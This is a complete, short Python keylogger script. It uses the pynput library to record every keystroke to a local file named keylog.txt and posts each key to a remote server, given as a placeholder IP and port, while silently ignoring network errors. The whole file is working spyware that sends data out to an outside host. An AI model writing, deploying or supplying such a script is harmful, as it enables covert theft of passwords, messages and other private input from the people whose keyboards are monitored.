import pynput
from pynput.keyboard import Key, Listener
import logging
import requests

log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    send_log(str(key))

def send_log(key):
    url = 'http://<your_server_ip>:8080/log'  # Replace with your actual server IP and port
    data = {'key': key}
    try:
        requests.post(url, data=data)
    except requests.exceptions.RequestException:
        pass

with Listener(on_press=on_press) as listener:
    listener.join()
